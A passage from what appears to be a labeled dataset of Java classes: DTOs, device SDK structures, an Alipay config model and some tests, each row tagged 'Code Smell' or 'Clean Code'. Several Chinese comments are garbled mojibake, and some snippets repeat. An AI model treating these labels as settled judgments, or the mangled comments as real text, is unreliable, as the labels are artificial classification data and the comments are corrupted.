  public List<HistoryFsReportDTO> getHistoryFsReportDTOList(){
    return historyFsReportDTOList;
  }
  public void setHistoryFsReportDTOList(  List<HistoryFsReportDTO> historyFsReportDTOList){
    this.historyFsReportDTOList=historyFsReportDTOList;
  }
  public List<HistoryConfigReportDTO> getHistoryConfigReportDTOList(){
    return historyConfigReportDTOList;
  }
  public void setHistoryConfigReportDTOList(  List<HistoryConfigReportDTO> historyConfigReportDTOList){
    this.historyConfigReportDTOList=historyConfigReportDTOList;
  }
  public List<HistoryK8sReportDTO> getHistoryK8sReportDTOList(){
    return historyK8sReportDTOList;
  }
  public void setHistoryK8sReportDTOList(  List<HistoryK8sReportDTO> historyK8sReportDTOList){
    this.historyK8sReportDTOList=historyK8sReportDTOList;
  }
}",1,Code Smell
"public static class CFG_OSD_INFO extends SdkStructure {
  public byte abShowEnable;
  public CFG_RGBA stuFrontColor=new CFG_RGBA();
  public CFG_RGBA stuBackColor=new CFG_RGBA();
  public CFG_RECT stuRect=new CFG_RECT();
  public int bShowEnable;
}
",1,Code Smell
"/** 
 * 閰嶇疆鍙傛暟妯″瀷
 */
public static class Config extends TeaModel {
  /** 
 * 閫氫俊鍗忚锛岄氬父濉啓https
 */
  @NameInMap(""protocol"") @Validation(required=true) public String protocol;
  /** 
 * 缃戝叧鍩熷悕 绾夸笂涓猴細openapi.alipay.com 娌欑涓猴細openapi.alipaydev.com
 */
  @NameInMap(""gatewayHost"") @Validation(required=true) public String gatewayHost;
  /** 
 * AppId
 */
  @NameInMap(""appId"") @Validation(required=true) public String appId;
  /** 
 * 绛惧悕绫诲瀷锛孉lipay Easy SDK鍙帹鑽愪娇鐢≧SA2锛屼及姝ゅ鍥哄畾濉啓RSA2
 */
  @NameInMap(""signType"") @Validation(required=true) public String signType;
  /** 
 * 鏀粯瀹濆叕閽
 */
  @NameInMap(""alipayPublicKey"") public String alipayPublicKey;
  /** 
 * 搴旂敤绉侀挜
 */
  @NameInMap(""merchantPrivateKey"") @Validation(required=true) public String merchantPrivateKey;
  /** 
 * 搴旂敤鍏挜璇佷功鏂囦欢璺緞
 */
  @NameInMap(""merchantCertPath"") public String merchantCertPath;
  /** 
 * 鏀粯瀹濆叕閽ヨ瘉涔︽枃浠惰矾寰
 */
  @NameInMap(""alipayCertPath"") public String alipayCertPath;
  /** 
 * 鏀粯瀹濇牴璇佷功鏂囦欢璺緞
 */
  @NameInMap(""alipayRootCertPath"") public String alipayRootCertPath;
  /** 
 * 寮傛閫氱煡鍥炶皟鍦板潃锛堝彲閫夛級
 */
  @NameInMap(""notifyUrl"") public String notifyUrl;
  /** 
 * AES瀵嗛挜锛堝彲閫夛級
 */
  @NameInMap(""encryptKey"") public String encryptKey;
}",1,Code Smell
"public class ServiceTask extends Task implements HasAction, Stateless {
  private String implementation;
  private String skipExpression;
  private String operationRef;
  private String type;
  private IAction action;
  public String getImplementation(){
    return implementation;
  }
  public void setImplementation(  String implementation){
    this.implementation=implementation;
  }
  public String getOperationRef(){
    return operationRef;
  }
  public void setOperationRef(  String operationRef){
    this.operationRef=operationRef;
  }
  public String getSkipExpression(){
    return skipExpression;
  }
  public void setSkipExpression(  String skipExpression){
    this.skipExpression=skipExpression;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  @Override public IAction getAction(){
    return action;
  }
  @Override public void setAction(  IAction action){
    this.action=action;
  }
}
",1,Code Smell
"public static class VO {
  private Currency value;
  public Currency getValue(){
    return value;
  }
  public void setValue(  Currency value){
    this.value=value;
  }
}
public static class VO {
  public Currency value;
}
public static class VO {
  public Currency value;
}
public static class VO {
  private Currency value;
  private Currency value1;
  public Currency getValue(){
    return value;
  }
  public void setValue(  Currency value){
    this.value=value;
  }
  public Currency getValue1(){
    return value1;
  }
  public void setValue1(  Currency value1){
    this.value1=value1;
  }
}
public static class VO {
  public static final int id=1001;
  public final int value=1001;
}
public static class VO {
  private int value;
  public boolean getValue(){
    return value == 1;
  }
  public void setValue(  int value){
    this.value=value;
  }
}
public interface VO {
  @JSONField int getId();
  @JSONField void setId(  int val);
}
public interface VO {
  @JSONField int getId();
  @JSONField void setId(  int val);
}
public interface VO {
  @JSONField int getId();
  @JSONField void setId(  int val);
}
@JSONType public static class VO {
  private int id;
  private String name;
  private int age;
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
}",1,Code Smell
"/** 
 * Created on 2020-09-16.
 * @author wangxiaodong
 */
public class Area {
  private String name;
  private String value;
  private List<Area> children;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
  public List<Area> getChildren(){
    return children;
  }
  public void setChildren(  List<Area> children){
    this.children=children;
  }
  @Override public String toString(){
    return name;
  }
}",1,Code Smell
"/** 
 * Represents a set of interchangeable encoded versions of a media content component.
 */
public class AdaptationSet {
  /** 
 * Value of  {@link #id} indicating no value is set.=
 */
  public static final int ID_UNSET=-1;
  /** 
 * A non-negative identifier for the adaptation set that's unique in the scope of its containing period, or  {@link #ID_UNSET} if not specified.
 */
  public final int id;
  /** 
 * The type of the adaptation set. One of the  {@link com.google.android.exoplayer2.C}{@code TRACK_TYPE_*} constants.
 */
  public final int type;
  /** 
 * {@link Representation}s in the adaptation set.
 */
  public final List<Representation> representations;
  /** 
 * Accessibility descriptors in the adaptation set.
 */
  public final List<Descriptor> accessibilityDescriptors;
  /** 
 * Supplemental properties in the adaptation set.
 */
  public final List<Descriptor> supplementalProperties;
  /** 
 * @param id A non-negative identifier for the adaptation set that's unique in the scope of itscontaining period, or  {@link #ID_UNSET} if not specified.
 * @param type The type of the adaptation set. One of the {@link com.google.android.exoplayer2.C}{@code TRACK_TYPE_*} constants.
 * @param representations {@link Representation}s in the adaptation set.
 * @param accessibilityDescriptors Accessibility descriptors in the adaptation set.
 * @param supplementalProperties Supplemental properties in the adaptation set.
 */
  public AdaptationSet(  int id,  int type,  List<Representation> representations,  List<Descriptor> accessibilityDescriptors,  List<Descriptor> supplementalProperties){
    this.id=id;
    this.type=type;
    this.representations=Collections.unmodifiableList(representations);
    this.accessibilityDescriptors=accessibilityDescriptors == null ? Collections.emptyList() : Collections.unmodifiableList(accessibilityDescriptors);
    this.supplementalProperties=supplementalProperties == null ? Collections.emptyList() : Collections.unmodifiableList(supplementalProperties);
  }
}",1,Code Smell
"final class SparkContainerProperties {
  private SparkContainerProperties(){
  }
  public static final String SPARK_VERSION=System.getProperty(""spark.version"");
  public static final String SCALA_BINARY_VERSION=System.getProperty(""scala.binary.version"");
  public static final String SPARK_DOCKER_IMAGE=System.getProperty(""spark.docker.image"");
  public static final String SCALA_JAR_NAME=System.getProperty(""scala.fixtures.jar.name"");
  public static final Path HOST_LIB_DIR=Paths.get(System.getProperty(""lib.dir"")).toAbsolutePath();
  public static final Path HOST_DEPENDENCIES_DIR=Paths.get(System.getProperty(""dependencies.dir"")).toAbsolutePath();
  public static final Path HOST_RESOURCES_DIR=Paths.get(System.getProperty(""resources.dir"")).toAbsolutePath();
  public static final Path HOST_LOG4J_PROPERTIES_PATH=HOST_RESOURCES_DIR.resolve(""log4j.properties"").toAbsolutePath();
  public static final Path HOST_LOG4J2_PROPERTIES_PATH=HOST_RESOURCES_DIR.resolve(""log4j2.properties"").toAbsolutePath();
  public static final Path HOST_FIXTURES_DIR=Paths.get(System.getProperty(""fixtures.dir"")).toAbsolutePath();
  public static final Path HOST_SCALA_FIXTURES_JAR_PATH=HOST_FIXTURES_DIR.resolve(SCALA_JAR_NAME).toAbsolutePath();
  public static final Path HOST_ADDITIONAL_JARS_DIR=Paths.get(System.getProperty(""additional.jars.dir"")).toAbsolutePath();
  public static final Path HOST_ADDITIONAL_CONF_DIR=Paths.get(System.getProperty(""additional.conf.dir"")).toAbsolutePath();
  public static final Path CONTAINER_SPARK_HOME_DIR=Paths.get(System.getProperty(""spark.home.dir""));
  public static final Path CONTAINER_SPARK_JARS_DIR=CONTAINER_SPARK_HOME_DIR.resolve(""jars"");
  public static final Path CONTAINER_SPARK_CONF_DIR=CONTAINER_SPARK_HOME_DIR.resolve(""conf"");
  public static final Path CONTAINER_FIXTURES_DIR=CONTAINER_SPARK_HOME_DIR.resolve(""work/fixtures"");
  public static final Path CONTAINER_FIXTURES_JAR_PATH=CONTAINER_FIXTURES_DIR.resolve(SCALA_JAR_NAME);
  public static final Path CONTAINER_LOG4J_PROPERTIES_PATH=CONTAINER_SPARK_CONF_DIR.resolve(""log4j.properties"");
  public static final Path CONTAINER_LOG4J2_PROPERTIES_PATH=CONTAINER_SPARK_CONF_DIR.resolve(""log4j2.properties"");
}",1,Code Smell
"public static class RspNextSystemMsg extends MessageMicro<RspNextSystemMsg> {
  static final FieldMap __fieldMap__;
  public final PBStringField bytes_game_nick=PBField.initString("""");
  public final PBBytesField bytes_undecid_for_qim=PBField.initBytes(ByteStringMicro.EMPTY);
  public final PBEnumField checktype=PBField.initEnum(1);
  public final PBUInt64Field following_friend_seq=PBField.initUInt64(0L);
  public final PBUInt64Field following_group_seq=PBField.initUInt64(0L);
  public RspHead head=new RspHead();
  public final PBRepeatMessageField<StructMsg> msgs=PBField.initRepeatMessage(StructMsg.class);
  public final PBUInt32Field uint32_un_read_count3=PBField.initUInt32(0);
static {
    Long long_=Long.valueOf(0L);
    ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
    __fieldMap__=MessageMicro.initFieldMap(new int[]{10,18,24,32,40,802,810,816},new String[]{""head"",""msgs"",""following_friend_seq"",""following_group_seq"",""checktype"",""bytes_game_nick"",""bytes_undecid_for_qim"",""uint32_un_read_count3""},new Object[]{null,null,long_,long_,Integer.valueOf(1),"""",byteStringMicro,Integer.valueOf(0)},RspNextSystemMsg.class);
  }
}",1,Code Smell
"/** 
 * sql 璇诲彇甯搁噺绫�
 * @author tangkc
 * @author houxinyu
 * @author Bryan.Zhang
 * @since 2.11.1
 */
public class SqlReadConstant {
  public static final String SQL_PATTERN=""SELECT * FROM {} WHERE {}=?"";
  public static final String SCRIPT_SQL_CHECK_PATTERN=""SELECT 1 FROM {} "";
  public static final String SCRIPT_SQL_PATTERN=""SELECT * FROM {} WHERE {}=?"";
  public static final String CHAIN_XML_PATTERN=""<chain name=\""{}\""><![CDATA[{}]]></chain>"";
  public static final String NODE_XML_PATTERN=""<nodes>{}</nodes>"";
  public static final String NODE_ITEM_XML_PATTERN=""<node id=\""{}\"" name=\""{}\"" type=\""{}\""><![CDATA[{}]]></node>"";
  public static final String NODE_ITEM_WITH_LANGUAGE_XML_PATTERN=""<node id=\""{}\"" name=\""{}\"" type=\""{}\"" language=\""{}\""><![CDATA[{}]]></node>"";
  public static final String XML_PATTERN=""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><flow>{}{}</flow>"";
  public static final Integer FETCH_SIZE_MAX=1000;
}",1,Code Smell
"public static class NET_DVR_LOG extends Structure {
  public NET_DVR_TIME strLogTime;
  public int dwMajorType;
  public int dwMinorType;
  public byte[] sPanelUser=new byte[MAX_NAMELEN];
  public byte[] sNetUser=new byte[MAX_NAMELEN];
  public byte[] sRemoteHostAddr=new byte[16];
  public int dwParaType;
  public int dwChannel;
  public int dwDiskNumber;
  public int dwAlarmInPort;
  public int dwAlarmOutPort;
}",1,Code Smell
"public static class ALARM_TRAF_CONGESTION_INFO extends SdkStructure {
  public int nDriveWayID;
  public int nCongestionLevel;
  public NET_TIME stuTime;
  public int nState;
  public int dwChannel;
  public byte[] reserve=new byte[28];
}",1,Code Smell
"public static class NET_IN_TRANSMIT_INFO extends SdkStructure {
  public int dwSize;
  public int emType;
  public String szInJsonBuffer;
  public int dwInJsonBufferSize;
  public Pointer szInBinBuffer;
  public int dwInBinBufferSize;
  public int emEncryptType;
  public NET_IN_TRANSMIT_INFO(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class EM_FOG_LEVEL extends SdkStructure {
  public static final int EM_FOG_LEVEL_UNKNOWN=0;
  public static final int EM_FOG_LEVEL_NO=1;
  public static final int EM_FOG_LEVEL_BLUE=2;
  public static final int EM_FOG_LEVEL_YELLOW=3;
  public static final int EM_FOG_LEVEL_ORANGE=4;
  public static final int EM_FOG_LEVEL_RED=5;
}",1,Code Smell
"/** 
 * @author Truman.P.Du
 * @date 2020/08/01
 * @description Topic涓嶨roup鐩稿叧淇℃伅
 */
public class TopicGroup {
  private String clusterId;
  private String topic;
  private String group;
  private String consumerType;
  public TopicGroup(){
  }
  public TopicGroup(  String clusterId,  String topic,  String group,  String consumerType){
    this.clusterId=clusterId;
    this.topic=topic;
    this.group=group;
    this.consumerType=consumerType;
  }
  public String getClusterId(){
    return clusterId;
  }
  public void setClusterId(  String clusterId){
    this.clusterId=clusterId;
  }
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public String getGroup(){
    return group;
  }
  public void setGroup(  String group){
    this.group=group;
  }
  public String getConsumerType(){
    return consumerType;
  }
  public void setConsumerType(  String consumerType){
    this.consumerType=consumerType;
  }
  public String generateKey(){
    return clusterId + Constants.Symbol.VERTICAL_STR + topic+ Constants.Symbol.VERTICAL_STR+ group+ Constants.Symbol.VERTICAL_STR+ consumerType;
  }
}",1,Code Smell
"public class ActivityErrno extends Errno {
  public static final String TYPE=""Activity Error"";
  public static final Errno ERRNO_START_ACTIVITY_FAILED_WITH_EXCEPTION=new Errno(TYPE,100,""Failed to start \""%1$s\"" activity.\nException: %2$s"");
  public static final Errno ERRNO_START_ACTIVITY_FOR_RESULT_FAILED_WITH_EXCEPTION=new Errno(TYPE,101,""Failed to start \""%1$s\"" activity for result.\nException: %2$s"");
  public static final Errno ERRNO_STARTING_ACTIVITY_WITH_NULL_CONTEXT=new Errno(TYPE,102,""Cannot start \""%1$s\"" activity with null Context"");
  ActivityErrno(  final String type,  final int code,  final String message){
    super(type,code,message);
  }
}",1,Code Smell
"/** 
 * This class represents a nullable heap array column vector. 
 */
public class HeapArrayVector extends AbstractHeapVector implements WritableColumnVector, ArrayColumnVector {
  private long[] offsets;
  private long[] lengths;
  private int size;
  private ColumnVector child;
  public HeapArrayVector(  int len){
    super(len);
    this.offsets=new long[len];
    this.lengths=new long[len];
  }
  public HeapArrayVector(  int len,  ColumnVector vector){
    super(len);
    this.offsets=new long[len];
    this.lengths=new long[len];
    this.child=vector;
  }
  public long[] getOffsets(){
    return offsets;
  }
  public void setOffsets(  long[] offsets){
    this.offsets=offsets;
  }
  public long[] getLengths(){
    return lengths;
  }
  public void setLengths(  long[] lengths){
    this.lengths=lengths;
  }
  public int getSize(){
    return size;
  }
  public void setSize(  int size){
    this.size=size;
  }
  public ColumnVector getChild(){
    return child;
  }
  public void setChild(  ColumnVector child){
    this.child=child;
  }
  @Override public InternalArray getArray(  int i){
    long offset=offsets[i];
    long length=lengths[i];
    return new ColumnarArray(child,(int)offset,(int)length);
  }
  @Override public ColumnVector getColumnVector(){
    return child;
  }
}
",1,Code Smell
"/** 
 * WatsonX.ai connection autoconfiguration properties.
 * @author Pablo Sanchidrian Herrera
 * @author John Jario Moreno Rojas
 * @since 1.0.0
 */
@ConfigurationProperties(WatsonxAiConnectionProperties.CONFIG_PREFIX) public class WatsonxAiConnectionProperties {
  public static final String CONFIG_PREFIX=""spring.ai.watsonx.ai"";
  private String baseUrl=""https://us-south.ml.cloud.ibm.com/"";
  private String streamEndpoint=""generation/stream?version=2023-05-29"";
  private String textEndpoint=""generation/text?version=2023-05-29"";
  private String projectId;
  private String IAMToken;
  public String getBaseUrl(){
    return baseUrl;
  }
  public void setBaseUrl(  String baseUrl){
    this.baseUrl=baseUrl;
  }
  public String getStreamEndpoint(){
    return streamEndpoint;
  }
  public void setStreamEndpoint(  String streamEndpoint){
    this.streamEndpoint=streamEndpoint;
  }
  public String getTextEndpoint(){
    return textEndpoint;
  }
  public void setTextEndpoint(  String textEndpoint){
    this.textEndpoint=textEndpoint;
  }
  public String getProjectId(){
    return projectId;
  }
  public void setProjectId(  String projectId){
    this.projectId=projectId;
  }
  public String getIAMToken(){
    return IAMToken;
  }
  public void setIAMToken(  String IAMToken){
    this.IAMToken=IAMToken;
  }
}",1,Code Smell
"public static class EM_PERSON_FEATURE_STATE extends SdkStructure {
  public static final int EM_PERSON_FEATURE_UNKNOWN=0;
  public static final int EM_PERSON_FEATURE_FAIL=1;
  public static final int EM_PERSON_FEATURE_USEFUL=2;
  public static final int EM_PERSON_FEATURE_CALCULATING=3;
  public static final int EM_PERSON_FEATURE_UNUSEFUL=4;
}",1,Code Smell
"/** 
 * @author xuxueli 2019-05-04 16:43:12
 */
public class JobUser {
  private int id;
  @ApiModelProperty(""璐﹀彿"") private String username;
  @ApiModelProperty(""瀵嗙爜"") private String password;
  @ApiModelProperty(""瑙掕壊锛0-鏅氱敤鎴枫1-绠＄悊鍛"") private String role;
  @ApiModelProperty(""鏉冮檺锛氭墽琛屽櫒ID鍒楄〃锛屽涓楀彿鍒嗗壊"") private String permission;
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public String getRole(){
    return role;
  }
  public void setRole(  String role){
    this.role=role;
  }
  public String getPermission(){
    return permission;
  }
  public void setPermission(  String permission){
    this.permission=permission;
  }
  public boolean validPermission(  int jobGroup){
    if (""1"".equals(this.role)) {
      return true;
    }
 else {
      if (StringUtils.hasText(this.permission)) {
        for (        String permissionItem : this.permission.split("","")) {
          if (String.valueOf(jobGroup).equals(permissionItem)) {
            return true;
          }
        }
      }
      return false;
    }
  }
}",1,Code Smell
"public static class NET_DVR_EVENT_CARD_LINKAGE_CFG_V50 extends Structure {
  public int dwSize;
  public byte byProMode;
  public byte[] byRes1=new byte[3];
  public int dwEventSourceID;
  public NET_DVR_EVETN_CARD_LINKAGE_UNION uLinkageInfo=new NET_DVR_EVETN_CARD_LINKAGE_UNION();
  public byte[] byAlarmout=new byte[MAX_ALARMHOST_ALARMOUT_NUM];
  public byte[] byRes2=new byte[32];
  public byte[] byOpenDoor=new byte[MAX_DOOR_NUM_256];
  public byte[] byCloseDoor=new byte[MAX_DOOR_NUM_256];
  public byte[] byNormalOpen=new byte[MAX_DOOR_NUM_256];
  public byte[] byNormalClose=new byte[MAX_DOOR_NUM_256];
  public byte byMainDevBuzzer;
  public byte byCapturePic;
  public byte byRecordVideo;
  public byte[] byRes3=new byte[29];
  public byte[] byReaderBuzzer=new byte[MAX_CARD_READER_NUM_512];
  public byte[] byAlarmOutClose=new byte[MAX_ALARMHOST_ALARMOUT_NUM];
  public byte[] byAlarmInSetup=new byte[MAX_ALARMHOST_ALARMIN_NUM];
  public byte[] byAlarmInClose=new byte[MAX_ALARMHOST_ALARMIN_NUM];
  public byte[] byRes=new byte[500];
}",1,Code Smell
"public static final class RequestParams {
  private final boolean collectTableMetrics;
  private final boolean minifyTableMetrics;
  private final boolean collectMVMetrics;
  private final boolean minifyMVMetrics;
  public RequestParams(  boolean collectTableMetrics,  boolean minifyTableMetrics,  boolean collectMVMetrics,  boolean minifyMVMetrics){
    this.collectTableMetrics=collectTableMetrics;
    this.minifyTableMetrics=minifyTableMetrics;
    this.collectMVMetrics=collectMVMetrics;
    this.minifyMVMetrics=minifyMVMetrics;
  }
  public boolean isCollectTableMetrics(){
    return collectTableMetrics;
  }
  public boolean isMinifyTableMetrics(){
    return minifyTableMetrics;
  }
  public boolean isCollectMVMetrics(){
    return collectMVMetrics;
  }
  public boolean isMinifyMVMetrics(){
    return minifyMVMetrics;
  }
}
",1,Code Smell
"public static class NETDEV_AUTOMT_CFG extends SdkStructure {
  public int dwSize;
  public byte byAutoRebootDay;
  public byte byAutoRebootTime;
  public byte byAutoDeleteFilesTime;
  public byte[] reserved=new byte[13];
  public NETDEV_AUTOMT_CFG(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * metric computes entity class
 * @author zhp
 * @since 2022-09-15
 */
public class MetricCalEntity {
  /** 
 * total requests on the server
 */
  private AtomicLong reqNum;
  /** 
 * total successful requests on the server
 */
  private AtomicLong successFulReqNum;
  /** 
 * total request time on the server
 */
  private AtomicLong consumeReqTimeNum;
  /** 
 * total number of failed requests on the server
 */
  private AtomicLong failedReqNum;
  /** 
 * initialize
 */
  public MetricCalEntity(){
    this.reqNum=new AtomicLong();
    this.successFulReqNum=new AtomicLong();
    this.consumeReqTimeNum=new AtomicLong();
    this.failedReqNum=new AtomicLong();
  }
  public AtomicLong getReqNum(){
    return reqNum;
  }
  public void setReqNum(  AtomicLong reqNum){
    this.reqNum=reqNum;
  }
  public AtomicLong getSuccessFulReqNum(){
    return successFulReqNum;
  }
  public void setSuccessFulReqNum(  AtomicLong successFulReqNum){
    this.successFulReqNum=successFulReqNum;
  }
  public AtomicLong getConsumeReqTimeNum(){
    return consumeReqTimeNum;
  }
  public void setConsumeReqTimeNum(  AtomicLong consumeReqTimeNum){
    this.consumeReqTimeNum=consumeReqTimeNum;
  }
  public AtomicLong getFailedReqNum(){
    return failedReqNum;
  }
  public void setFailedReqNum(  AtomicLong failedReqNum){
    this.failedReqNum=failedReqNum;
  }
}",1,Code Smell
"public static class TableInfoProperty {
  public static String HASH_BUCKET_NUM=""hashBucketNum"";
  public static String DROPPED_COLUMN=""droppedColumn"";
  public static String DROPPED_COLUMN_SPLITTER="","";
  public static String LAST_TABLE_SCHEMA_CHANGE_TIME=""last_schema_change_time"";
}
",1,Code Smell
"/** 
 * 鍙傛暟淇℃伅
 * @author zhp
 * @since 2022-11-30
 */
public class ParamInfo {
  /** 
 * 鍙傛暟绫诲瀷
 */
  private String paramType;
  /** 
 * 鍙傛暟鍚嶇О
 */
  private String paramName;
  public String getParamType(){
    return paramType;
  }
  public void setParamType(  String paramType){
    this.paramType=paramType;
  }
  public String getParamName(){
    return paramName;
  }
  public void setParamName(  String paramName){
    this.paramName=paramName;
  }
}
/** 
 * 鍙傛暟淇℃伅
 * @author zhp
 * @since 2022-11-30
 */
public class ParamInfo {
  /** 
 * 鍙傛暟绫诲瀷
 */
  private String paramType;
  /** 
 * 鍙傛暟鍚嶇О
 */
  private String paramName;
  public String getParamType(){
    return paramType;
  }
  public void setParamType(  String paramType){
    this.paramType=paramType;
  }
  public String getParamName(){
    return paramName;
  }
  public void setParamName(  String paramName){
    this.paramName=paramName;
  }
}",1,Code Smell
"public final class FeedClientVideoContent {
  String coverUrl;
  String taskId;
  String videoId;
  String videoUrl;
  public FeedClientVideoContent(){
    this.taskId="""";
    this.videoId="""";
    this.videoUrl="""";
    this.coverUrl="""";
  }
  public String getCoverUrl(){
    return this.coverUrl;
  }
  public String getTaskId(){
    return this.taskId;
  }
  public String getVideoId(){
    return this.videoId;
  }
  public String getVideoUrl(){
    return this.videoUrl;
  }
  public String toString(){
    return ""FeedClientVideoContent{taskId="" + this.taskId + "",videoId=""+ this.videoId+ "",videoUrl=""+ this.videoUrl+ "",coverUrl=""+ this.coverUrl+ "",}"";
  }
  public FeedClientVideoContent(  String str,  String str2,  String str3,  String str4){
    this.taskId="""";
    this.videoId="""";
    this.videoUrl="""";
    this.coverUrl="""";
    this.taskId=str;
    this.videoId=str2;
    this.videoUrl=str3;
    this.coverUrl=str4;
  }
}",1,Code Smell
"class OneAttr {
  public String name;
  public int dvIndex;
  public int valueIndex;
  public Object dfltValue;
  public OneAttr(  String name,  int dvIndex,  int valueIndex,  Object dfltValue){
    this.name=name;
    this.dvIndex=dvIndex;
    this.valueIndex=valueIndex;
    this.dfltValue=dfltValue;
  }
}
",1,Code Smell
"/** 
 * harris
 */
public class Cloud {
  private List<Region> children;
  private String name;
  private String accountId;
  private String type;
  private Integer total;
  public List<Region> getChildren(){
    return children;
  }
  public void setChildren(  List<Region> children){
    this.children=children;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getAccountId(){
    return accountId;
  }
  public void setAccountId(  String accountId){
    this.accountId=accountId;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public Integer getTotal(){
    return total;
  }
  public void setTotal(  Integer total){
    this.total=total;
  }
}
",1,Code Smell
"class ExceptionLevelTest {
  @Test void testGetLevel(){
    assertEquals(1,ExceptionLevel.WARN.getLevel());
    assertEquals(2,ExceptionLevel.ERROR.getLevel());
    assertEquals(3,ExceptionLevel.FATAL.getLevel());
    assertEquals(4,ExceptionLevel.RETRY.getLevel());
  }
  @Test void testSetLevel(){
    ExceptionLevel.WARN.setLevel(-1);
    assertEquals(-1,ExceptionLevel.WARN.getLevel());
    ExceptionLevel.WARN.setLevel(1);
    assertEquals(1,ExceptionLevel.WARN.getLevel());
  }
  @Test void testGetName(){
    assertEquals(""warn"",ExceptionLevel.WARN.getName());
    assertEquals(""error"",ExceptionLevel.ERROR.getName());
    assertEquals(""fatal"",ExceptionLevel.FATAL.getName());
    assertEquals(""retry"",ExceptionLevel.RETRY.getName());
  }
  @Test void testSetName(){
    ExceptionLevel.ERROR.setName(""testError"");
    assertEquals(""testError"",ExceptionLevel.ERROR.getName());
    ExceptionLevel.ERROR.setName(""error"");
    assertEquals(""error"",ExceptionLevel.ERROR.getName());
  }
  @Test void testToString(){
    assertEquals(""ExceptionLevel{level=1, name='warn'}"",ExceptionLevel.WARN.toString());
    assertEquals(""ExceptionLevel{level=2, name='error'}"",ExceptionLevel.ERROR.toString());
    assertEquals(""ExceptionLevel{level=3, name='fatal'}"",ExceptionLevel.FATAL.toString());
    assertEquals(""ExceptionLevel{level=4, name='retry'}"",ExceptionLevel.RETRY.toString());
  }
}",0,Clean Code
"static class TraversalPath implements Path {
  private final Path parent;
  private final List<PathElement> pathElements;
  private TraversalPath(  Path parent,  PathElement pathElement){
    this.parent=parent;
    this.pathElements=parent != null ? StreamSupport.stream(parent.spliterator(),false).collect(Collectors.toList()) : new ArrayList<>(1);
    this.pathElements.add(pathElement);
  }
  static TraversalPath newPath(  Type type){
    return new TraversalPath(null,new TypePathElement(type,null));
  }
  @Override public Type getRootType(){
    return CollectionUtils.firstElement(pathElements).getType();
  }
  @Override public PathElement getLeaf(){
    return CollectionUtils.lastElement(pathElements);
  }
  @Override public Path getParent(){
    return parent;
  }
  @Override public int depth(){
    return pathElements.size() - 1;
  }
  @Override public TraversalPath append(  PathElement pathElement){
    return new TraversalPath(this,pathElement);
  }
  TraversalPath append(  Method method,  Type type){
    return append(new MethodPathElement(type,method));
  }
  TraversalPath append(  Field field,  Type type){
    return append(new FieldPathElement(type,field));
  }
  TraversalPath append(  Type parent,  Type type){
    return append(new TypePathElement(type,parent));
  }
  @Override public Iterator<PathElement> iterator(){
    return pathElements.iterator();
  }
  @Override public String toString(){
    return pathElements.stream().map(Objects::toString).collect(Collectors.joining("" -> ""));
  }
}
",0,Clean Code
"@Repository public class UserRepositoryImpl implements UserRepository {
  private Map<Long,User> users=new HashMap<Long,User>();
  @PostConstruct public void init() throws Exception {
    users.put(Long.valueOf(1),new User(1,""Jack"",""Smith"",20));
    users.put(Long.valueOf(2),new User(2,""Peter"",""Johnson"",25));
  }
  @Override public Mono<User> getUserById(  Long id){
    return Mono.just(users.get(id));
  }
  @Override public Flux<User> getAllUsers(){
    return Flux.fromIterable(this.users.values());
  }
  @Override public Flux<User> getAllUsers(  String firstname){
    return Flux.fromIterable(this.users.values().stream().filter(user -> user.getFirstname().equals(firstname)).toList());
  }
  @Override public Mono<Void> saveUser(  Mono<User> monoUser){
    Mono<User> userMono=monoUser.doOnNext(user -> {
      users.put(user.getId(),user);
      System.out.println(""########### POST:"" + user);
    }
);
    return userMono.then();
  }
  @Override public Mono<User> putUser(  Long id,  Mono<User> monoUser){
    Mono<User> userMono=monoUser.doOnNext(user -> {
      user.setId(id);
      users.put(id,user);
      System.out.println(""########### PUT:"" + user);
    }
);
    return userMono;
  }
  @Override public Mono<String> deleteUser(  Long id){
    users.remove(id);
    return Mono.just(""Delete Succesfully!"");
  }
}
",0,Clean Code
"public static class ActivityBuilder {
  private ActivityId id;
  private AccountId ownerAccountId;
  private AccountId sourceAccountId;
  private AccountId targetAccountId;
  private LocalDateTime timestamp;
  private Money money;
  public ActivityBuilder withId(  ActivityId id){
    this.id=id;
    return this;
  }
  public ActivityBuilder withOwnerAccount(  AccountId accountId){
    this.ownerAccountId=accountId;
    return this;
  }
  public ActivityBuilder withSourceAccount(  AccountId accountId){
    this.sourceAccountId=accountId;
    return this;
  }
  public ActivityBuilder withTargetAccount(  AccountId accountId){
    this.targetAccountId=accountId;
    return this;
  }
  public ActivityBuilder withTimestamp(  LocalDateTime timestamp){
    this.timestamp=timestamp;
    return this;
  }
  public ActivityBuilder withMoney(  Money money){
    this.money=money;
    return this;
  }
  public Activity build(){
    return new Activity(this.id,this.ownerAccountId,this.sourceAccountId,this.targetAccountId,this.timestamp,this.money);
  }
}
",0,Clean Code
"public abstract class AbstractJdbcFlowRepositoryTest extends io.kestra.core.repositories.AbstractFlowRepositoryTest {
  @Inject protected AbstractJdbcFlowRepository flowRepository;
  @Inject JdbcTestUtils jdbcTestUtils;
  @Inject protected JooqDSLContextWrapper dslContextWrapper;
  @Test public void findSourceCode(){
    List<SearchResult<Flow>> search=flowRepository.findSourceCode(Pageable.from(1,10,Sort.UNSORTED),""io.kestra.plugin.core.condition.MultipleCondition"",null,null);
    assertThat((long)search.size(),is(2L));
    SearchResult<Flow> flow=search.stream().filter(flowSearchResult -> flowSearchResult.getModel().getId().equals(""trigger-multiplecondition-listener"")).findFirst().orElseThrow();
